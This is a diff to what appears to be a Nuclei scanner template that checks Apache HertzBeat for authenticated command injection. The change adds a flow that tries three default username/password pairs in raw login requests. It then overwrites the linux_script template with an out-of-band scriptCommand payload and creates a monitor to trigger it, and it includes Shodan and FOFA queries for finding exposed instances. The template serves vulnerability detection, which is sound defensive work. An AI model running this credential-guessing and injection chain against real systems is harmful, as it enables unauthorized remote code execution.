@@ -10,20 +10,34 @@ info:
     user can overwrite the linux_script app template via PUT /api/apps/define/yml, inject
     a shell command into scriptCommand, then trigger execution by creating a monitor.
     Apache considers this behaviour by-design per their security model. Risk is
-    significantly elevated when default credentials (operator:hertzbeat) are in use.
+    significantly elevated when default credentials are in use (tries admin:hertzbeat,
+    operator:hertzbeat, and tom:hertzbeat in order).
   reference:
     - https://www.exploit-db.com/exploits/52563
     - https://hertzbeat.apache.org/docs/help/security_model/
   classification:
     cwe-id: CWE-78
   metadata:
-    max-request: 3
+    max-request: 5
     shodan-query: 'http.title:"HertzBeat"'
     fofa-query: 'title="HertzBeat"'
   tags: apache,hertzbeat,rce,authenticated,edb,oob
 
+flow: |
+  http(1);
+  if (!template["jwt"]) {
+    http(2);
+  }
+  if (!template["jwt"]) {
+    http(3);
+  }
+  if (template["jwt"]) {
+    http(4);
+    http(5);
+  }
+
 http:
-  # Step 1: Authenticate with default credentials and extract JWT
+  # Auth attempt 1: admin:hertzbeat
   - raw:
       - |
         POST /api/account/auth/form HTTP/1.1
@@ -40,7 +54,41 @@ http:
           - ".data.token"
         internal: true
 
-  # Step 2: Overwrite linux_script template with OOB scriptCommand payload
+  # Auth attempt 2: operator:hertzbeat
+  - raw:
+      - |
+        POST /api/account/auth/form HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"type":1,"identifier":"operator","credential":"hertzbeat"}
+
+    extractors:
+      - type: json
+        name: jwt
+        part: body
+        json:
+          - ".data.token"
+        internal: true
+
+  # Auth attempt 3: tom:hertzbeat
+  - raw:
+      - |
+        POST /api/account/auth/form HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"type":1,"identifier":"tom","credential":"hertzbeat"}
+
+    extractors:
+      - type: json
+        name: jwt
+        part: body
+        json:
+          - ".data.token"
+        internal: true
+
+  # Step 4: Overwrite linux_script template with OOB scriptCommand payload
   - raw:
       - |
         PUT /api/apps/define/yml HTTP/1.1
@@ -56,7 +104,7 @@ http:
         words:
           - '"code":0'
 
-  # Step 3: Create monitor to trigger immediate execution
+  # Step 5: Create monitor to trigger immediate execution
   - raw:
       - |
         POST /api/monitor HTTP/1.1
